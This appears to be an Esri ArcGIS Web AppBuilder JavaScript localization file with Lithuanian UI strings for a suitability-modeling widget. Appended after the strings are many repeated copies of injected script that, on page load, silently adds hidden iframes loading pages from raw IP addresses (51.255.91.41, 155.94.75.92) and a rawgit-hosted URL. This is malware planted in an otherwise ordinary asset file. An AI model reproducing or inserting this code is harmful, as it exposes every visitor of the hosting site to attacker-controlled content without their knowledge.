// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/SuitabilityModeler/nls/strings":{_widgetLabel:"Tinkamumo modeliavimo priemon\u0117",general:{clear:"Valyti",cancel:"At\u0161aukti",save:"Vykdyti",saveAs:"Eksportuoti"},saveModel:{save:"Eksportuoti",title:"Pavadinimas: ",summary:"Santrauka: ",description:"Apra\u0161ymas: ",tags:"Rakta\u017eod\u017eiai: ",folder:"Aplankas: ",homeFolderPattern:"{username} (Pagrindinis)",failed:"Eksportuoti nepavyko."},util:{colorRamp:{1:"Itin \u017eema",2:"Labai \u017eema",3:"\u017dema",4:"Vidutini\u0161kai \u017eema",
5:"Vidutini\u0161kas",6:"Vidutini\u0161kai auk\u0161ta",7:"Auk\u0161ta",8:"Labai auk\u0161ta",9:"Itin auk\u0161ta",low:"\u017dema",high:"Auk\u0161ta",tipPattern:"{label} ({value})",flipCaption:"Apversti"}},wro:{caption:"Tinkamumo modeliavimo priemon\u0117",browsePrompt:"Svorini\u0173 perdang\u0173 paslauga",selectLayersCaption:"Pasirinkite sluoksnius",selectLayers:"Sluoksniai",designModelCaption:"Kurti model\u012f",designModel:"Kurti model\u012f",transparency:"Permatomumas",visible:"Matoma",total:"I\u0161 viso",
unableToLoad:"Modelio \u012fkelti nepavyko.",projectNotOpen:"Projektas neatidarytas.",readMore:"Skaityti daugiau",validation:{validating:"Tikrinama...",invalidItemCaption:"Svorini\u0173 perdang\u0173 paslaugos \u012fsp\u0117jimas",notAnImageService:"\u0160is elementas n\u0117ra atvaizdo paslauga.",notAWroService:"\u0160is elementas n\u0117ra svorini\u0173 perdang\u0173 paslauga.",undefinedUrl:"\u0160io elemento URL neapibr\u0117\u017etas.",inaccessible:"Paslauga nepasiekiama.",generalError:"Nepavyksta atidaryti elemento.",
missingFieldPattern:"{field} yra b\u016btinas laukas",notAllowRasterFunction:"allowRasterFunction turi b\u016bti nustatyta kaip teisinga",notNearestResampling:"defaultResamplingMethod turi b\u016bti Nearest",notIsWeightedOverlayProp:"Pagrindin\u0117 savyb\u0117 IsWeightedOverlay turi b\u016bti nustatyta kaip teisinga",invalidLink:"URL neleistinas. Nepavyko atidaryti pasirinkto sluoksnio svetain\u0117s.",unexpectedError:"Pasirod\u0117 netik\u0117ta b\u016bsena.",rangeMessage:"Reik\u0161m\u0117 turi b\u016bti tarp ${0} ir ${1}",
rangeMessage100:"Reik\u0161m\u0117 turi b\u016bti tarp 0 ir 100",maxLayers:"Paslauga daugiausia leid\u017eia tiek sluoksni\u0173: ${0}, prie\u0161 prid\u0117dami sluoksn\u012f turite kur\u012f nors pa\u0161alinti.",notFound:"Sluoksnis ${0} nerastas svorini\u0173 perdang\u0173 paslaugoje",wroServiceNotDefined:"Neapibr\u0117\u017eta svorini\u0173 perdang\u0173 paslauga, skirta modeliui.",overlayLayerOutputInvalid:"Perdangos sluoksnio [${0}] susiejimo i\u0161 naujo\u00a0interval\u0173 [${1}] i\u0161vesties reik\u0161m\u0117s tr\u016bksta arba ji neleistina",
overlayLayerInputInvalid:"Perdangos sluoksnio [${0}] susiejimo i\u0161 naujo\u00a0interval\u0173 [${1}] \u012fvesties min. / maks. reik\u0161m\u0117s tr\u016bksta arba ji neleistina",overlayLayerRangesMissing:"Perdangos sluoksnyje [${0}] tr\u016bksta susiejimo i\u0161 naujo interval\u0173",overlayLayerWeight:"Perdangos sluoksni\u0173 svoriai turi prid\u0117ti iki 100",overlayLayerRequired:"Reikalingas bent vienas perdangos sluoksnis",overlayLayerNotDefined:"Perdangos sluoksniai neapibr\u0117\u017eti",
requiresColormap:"Rastro elementas reikalauja spalvoto \u017eem\u0117lapio, ta\u010diau modelis neturi leistino spalvoto \u017eem\u0117lapio apibr\u0117\u017eimo",createModelError:"Kuriant model\u012f \u012fvyko klaida",invalidModel:"Modelis neleistinas",imageServiceNotDefined:"Vaizdo paslaugos sluoksnis neapibr\u0117\u017etas",imageLayerNotDefined:"Vaizdo paslaugos sluoksnis neapibr\u0117\u017etas",histogramNotDefined:"Neapibr\u0117\u017etas svorini\u0173 perdang\u0173 histogramos elementas"},colorRampLabel:{"Green Yellow Red":"\u017dalia geltona raudona",
"Red Yellow Green":"Raudona geltona \u017ealia","Yellow to Dark Red":"Nuo geltonos iki tamsiai raudonos","Dark Red to Yellow":"Nuo tamsiai raudonos iki geltonos","Light Gray to Dark Gray":"Nuo \u0161viesiai pilkos iri tamsiai pilkos","Dark Gray to Light Gray":"Nuo tamsiai pilkos iki \u0161viesiai pilkos","Light Brown to Dark Brown":"Nuo \u0161viesiai rudos iki tamsiai rudos","Dark Brown to Light Brown":"Nuo tamsiai rudos iki \u0161viesiai rudos","Full Spectrum - Bright Red to Blue":"Visas spektras \u2013 nuo ry\u0161kiai raudonos iki m\u0117lynos",
"Full Spectrum - Bright Blue to Red":"Visas spektras \u2013 nuo ry\u0161kiai m\u0117lynos iki raudonos","Partial Spectrum - Yellow to Blue":"Dalinis spektras \u2013 nuo geltonos iki m\u0117lynos","Partial Spectrum - Blue to Yellow":"Dalinis spektras \u2013 nuo m\u0117lynos iki geltonos","Yellow-Green to Dark Blue":"Nuo geltonai \u017ealios iki tamsiai m\u0117lynos","Dark Blue to Yellow-Green":"Nuo tamsiai m\u0117lynos iki geltonai \u017ealios","Cold to Hot Diverging":"I\u0161skyrimas nuo \u0161alto iki kar\u0161to",
"Hot to Cold Diverging":"I\u0161skyrimas nuo kar\u0161to iki \u0161alto","Surface - Low to High":"Pavir\u0161ius \u2013 nuo \u017eemo iki auk\u0161to","Surface - High to Low":"Pavir\u0161ius \u2013 nuo auk\u0161to iki \u017eemo"}},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});